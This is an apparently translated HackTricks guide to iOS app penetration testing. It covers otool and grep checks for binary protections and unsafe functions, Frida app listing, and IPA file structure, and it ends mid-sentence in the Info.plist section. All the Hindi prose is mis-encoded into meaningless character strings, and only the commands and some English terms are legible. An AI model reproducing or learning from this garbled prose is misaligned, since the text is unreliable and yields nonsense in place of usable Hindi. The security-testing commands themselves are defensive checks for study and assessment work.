# iOS рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## iOS рдореВрд▓рднреВрдд

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## рдкрд░реАрдХреНрд╖рдг рдкрд░реНрдпрд╛рд╡рд░рдг

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдк **iOS рд╕рд┐рдореНрдпреБрд▓реЗрдЯрд░**, **рдПрдореНрдпреБрд▓реЗрдЯрд░** рдФрд░ **рдЬреЗрд▓рдмреНрд░реЗрдХрд┐рдВрдЧ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

### рдореВрд▓ iOS рдкрд░реАрдХреНрд╖рдг рдХрд╛рд░реНрд░рд╡рд╛рдИ

рдкрд░реАрдХреНрд╖рдг рдХреЗ рджреМрд░рд╛рди **рдХрдИ рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕реБрдЭрд╛рдИ рдЬрд╛рдПрдВрдЧреА** (рдбрд┐рд╡рд╛рдЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ, рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реЗрдВ/рд▓рд┐рдЦреЗрдВ/рдЕрдкрд▓реЛрдб/рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, рдХреБрдЫ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ...). рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдХреИрд╕реЗ рдХрд░реЗрдВ рдпрд╣ рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реИрдВ рддреЛ рдХреГрдкрдпрд╛, **рдкреГрд╖реНрда рдкрдврд╝рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП** рдФрд░ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ **IPA рдлрд╝рд╛рдЗрд▓** рдкрд╣рд▓реЗ рд╣реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓рд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рдЗрд╕рдХреЗ рд▓рд┐рдП [Basic iOS Testing Operations](basic-ios-testing-operations.md) рдкреГрд╖реНрда рдкрдврд╝реЗрдВред
{% endhint %}

### рдореВрд▓ рд╕реНрдерд┐рд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

**MobSF** рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕реБрдЭрд╛рд╡рд┐рдд рд╣реИ рддрд╛рдХрд┐ IPA рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕реНрдерд┐рд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдмрд╛рдЗрдирд░ рдореЗрдВ рдореМрдЬреВрдж **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди**:

*   **PIE (рд╕реНрдерд┐рддрд┐ рд╕реНрд╡рдд: рд╕реНрдерд╛рдиреАрдп рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓)**: рдЬрдм рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдРрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд░ рдмрд╛рд░ рдПрдХ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдореЗрдореЛрд░реА рдкрддреЗ рдореЗрдВ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕рдХрд╛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдореЗрдореЛрд░реА рдкрддрд╛ рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рди рдХрд░рдирд╛ рдХрдард┐рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

```bash
otool -hv <app-binary> | grep PIE   # рдЗрд╕рдореЗрдВ PIE рдзреНрд╡рдЬ рд╢рд╛рдорд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
```
*   **рд╕реНрдЯреИрдХ рдХреИрдиреЗрд░реАрдЬ**: рд╕реНрдЯреИрдХ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдЯреИрдХ рдкрд░ 'рдХреИрдиреЗрд░реА' рдорд╛рдирдХ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рдлрд┐рд░ рд╕реЗ рдкреБрд╖реНрдЯрд┐ рдХреА рдЬрд╛рддреА рд╣реИред

```bash
otool -I -v <app-binary> | grep stack_chk   # рдЗрд╕рдореЗрдВ stack_chk_guard рдФрд░ stack_chk_fail рдкреНрд░рддреАрдХ рд╢рд╛рдорд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
```
*   **ARC (рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд╕рдВрджрд░реНрдн рдЧрдгрдирд╛)**: рд╕рд╛рдорд╛рдиреНрдп рдореЗрдореЛрд░реА рдХреЛрд░рдкреНрд╢рди рджреЛрд╖реЛрдВ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП

```bash
otool -I -v <app-binary> | grep objc_release   # рдЗрд╕рдореЗрдВ _objc_release рдкреНрд░рддреАрдХ рд╢рд╛рдорд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
```
*   **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмрд╛рдЗрдирд░реА**: рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
```

**рд╕рдВрд╡реЗрджрдирд╢реАрд▓/рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди**

*   **рдХрдордЬреЛрд░ рд╣реИрд╢рд┐рдВрдЧ рдПрд▓реНрдЧреЛрд░рд┐рджрдо**

```bash
# iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# рд▓рд┐рдирдХреНрд╕ рдкрд░
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реИрдВрдбрдо рдлрд╝рдВрдХреНрд╢рдиреНрд╕**

```bash
# iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# рд▓рд┐рдирдХреНрд╕ рдкрд░
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд тАШрдореИрд▓реЛрдХтАЩ рдлрд╝рдВрдХреНрд╢рди**

```bash
# iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░
otool -Iv <app> | grep -w "_malloc"

# рд▓рд┐рдирдХреНрд╕ рдкрд░
grep -iER "_malloc"
```
*   **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рд╡рдВрд▓рд░реЗрдмрд▓ рдлрд╝рдВрдХреНрд╢рдиреНрд╕**

```bash
# iOS рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# рд▓рд┐рдирдХреНрд╕ рдкрд░
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### рдореВрд▓ рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рджреЗрдЦреЗрдВ рдХрд┐ [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рддрд╛ рд╣реИред рдЖрдкрдХреЛ рд╡рд┐рднрд┐рдиреНрди рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдФрд░ рдЙрдирд╕реЗ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди рдпрд╣ рдХрдИ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рд╣реБрдХ рдХрд░реЗрдЧрд╛ рдФрд░ рдЕрдиреНрдп рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░реЗрдЧрд╛ рдФрд░ рдЬрдм рдЖрдк рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ рддреЛ рдПрдХ рд░рд┐рдкреЛрд░реНрдЯ рддреИрдпрд╛рд░ рдХрд░реЗрдЧрд╛ред

### рд╕реНрдерд╛рдкрд┐рдд рдРрдкреНрд╕ рдХреА рд╕реВрдЪреА

**рдмрдВрдбрд▓ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП `frida-ps -Uai` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### рдореВрд▓ рд╕реВрдЪреАрдХрд░рдг рдФрд░ рд╣реБрдХрд┐рдВрдЧ

рд╕реАрдЦреЗрдВ рдХреИрд╕реЗ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдШрдЯрдХреЛрдВ рдХреА рд╕реВрдЪреАрдХрд░рдг** рдХрд░реЗрдВ рдФрд░ рдХреИрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд┐рдзрд┐рдпреЛрдВ рдФрд░ рд╡рд░реНрдЧреЛрдВ рдХреЛ рд╣реБрдХ** рдХрд░реЗрдВ objection рдХреЗ рд╕рд╛рде:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA рд╕рдВрд░рдЪрдирд╛

**IPA рдлрд╝рд╛рдЗрд▓** рдХреА рд╕рдВрд░рдЪрдирд╛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдПрдХ **рдЬрд╝рд┐рдк рдкреИрдХреЗрдЬ** рдХреА рддрд░рд╣ рд╣реИред рдЗрд╕рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ `.zip` рдореЗрдВ рдмрджрд▓рдХрд░, рдЗрд╕реЗ **рдбреАрдХрдВрдкреНрд░реЗрд╕** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рдХрдЯ рд╣реЛред рдЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдореЗрдВ, рдПрдХ **рдмрдВрдбрд▓** рдПрдХ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкреИрдХреЗрдЬ рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрдВрджрд░, рдЖрдкрдХреЛ `<рдирд╛рдо>.app` рдирд╛рдордХ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдорд┐рд▓реЗрдЧреА, рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдХрд░рддреА рд╣реИред

* **`Info.plist`**: рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдиреНрдпрд╛рд╕ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рдзрд╛рд░рдг рдХрд░рддреА рд╣реИред
* **`_CodeSignature/`**: рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдПрдХ рдкреНрд▓рд┐рд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ рдЬреЛ рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИ, рдЬреЛ рдмрдВрдбрд▓ рдореЗрдВ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЕрдЦрдВрдбрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИред
* **`Assets.car`**: рдПрдХ рд╕рдВрдХреБрдЪрд┐рдд рдЖрд░реНрдХрд╛рдЗрд╡ рдЬреЛ рдЖрдЗрдХрди рдЬреИрд╕реА рд╕рдВрдкрддреНрддрд┐ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИред
* **`Frameworks/`**: рдпрд╣ рдлрд╝реЛрд▓реНрдбрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдореВрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИ, рдЬреЛ `.dylib` рдпрд╛ `.framework` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
* **`PlugIns/`**: рдЗрд╕рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╡рд┐рд╕реНрддрд╛рд░ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ `.appex` рдлрд╝рд╛рдЗрд▓реЗрдВ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╡реЗ рд╣рдореЗрд╢рд╛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрдерд╛рдпреА рдбреЗрдЯрд╛ рдХреЛ рдСрдлрд╝рд▓рд╛рдЗрди рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рд╕рд╣реЗрдЬрдиреЗ, рдЕрд╕реНрдерд╛рдпреА рдбреЗрдЯрд╛ рдХреИрд╢ рдХрд░рдиреЗ рдФрд░ рдЖрдкрдХреЗ рдРрдк рдореЗрдВ рдЕрдиреНрдбреВ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдкрд░ рдЕрдкрдиреЗ рдРрдк рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдХреЛ рдХрдИ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рд╕рд┐рдВрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Core Data рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рд╕реНрдХреАрдорд╛ рдХреЛ рдПрдХ CloudKit рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдорд┐рд░рд░ рдХрд░рддрд╛ рд╣реИред
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` рдлрд╝рд╛рдЗрд▓ рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдмрдВрдбрд▓ рдХреЗ рдкреНрд░рдХрд╛рд░ рдФрд░ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛрдб рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рддрд░реАрдХрд╛ рд╣реИред
* **en.lproj, fr.proj, Base.lproj**: рдпреЗ рднрд╛рд╖рд╛ рдкреИрдХ рд╣реИрдВ рдЬреЛ рдЙрди рд╡рд┐рд╢рд┐рд╖реНрдЯ рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕рд╛рдзрди рдЬреЛ рднрд╛рд╖рд╛ рдХреЛ рд╕рдорд░реНрдерд┐рдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред
* **рд╕реБрд░рдХреНрд╖рд╛**: `_CodeSignature/` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддреА рд╣реИ рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рднреА рдмрдВрдбрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХреА рдЬрд╛рддреА рд╣реИред
* **рд╕рдВрдкрддреНрддрд┐ рдкреНрд░рдмрдВрдзрди**: `Assets.car` рдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрддреНрддрд┐рдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреБрдЪрд┐рдд рдХрд░рддреА рд╣реИ, рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХрд╛ рд╕рдордЧреНрд░ рдЖрдХрд╛рд░ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред
* **рдлреНрд░реЗрдорд╡рд░реНрдХ рдФрд░ рдкреНрд▓рдЧрдЗрдВрд╕**: рдпреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ iOS рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреА рдореЙрдбреНрдпреВрд▓реИрд░рд┐рдЯреА рдХреЛ рдЕрдВрдЧреАрдХрд╛рд░ рдХрд░рддреА рд╣реИрдВ, рдЬреЛ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рдкреБрди: рдЙрдкрдпреЛрдЧреА рдХреЛрдб рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ (`Frameworks/`) рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдФрд░ рдРрдк рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ (`PlugIns/`)ред
* **рд╕реНрдерд╛рдиреАрдпрдХрд░рдг**: рдпрд╣ рд╕рдВрд░рдЪрдирд╛ рд╡рд┐рд╢реЗрд╖ рднрд╛рд╖рд╛ рдкреИрдХ рдХреЗ рд▓рд┐рдП рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдХреЗ рд╡реИрд╢реНрд╡рд┐рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд╣реБрдВрдЪ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддреА рд╣реИред

**Info.plist**

**Info.plist** iOS рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдореВрд▓ рд╕реНрддрдВрдн рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, **рдХреА-рдорд╛рдирдХ** рдЬреЛрдбрд╝реА рдХреЗ рд░реВрдк рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЖрд╡рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдХреЗрд╡рд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╣реА рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдФрд░ рдлрд╝реНрд░реЗрдорд╡рд░реНрдХ рднреА рдмрдВрдбрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рдпрд╛ рддреЛ XML рдореЗрдВ рдпрд╛ рдПрдХ рдмрд╛рдЗрдирд░реА рд╕реНрд╡рд░реВрдк рдореЗрдВ рд╕рдВрд░рдЪрд┐рдд рд╣реИ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдиреНрдпрд╛рд╕реЛрдВ рддрдХ рд╡рд┐рднрд┐рдиреНрди 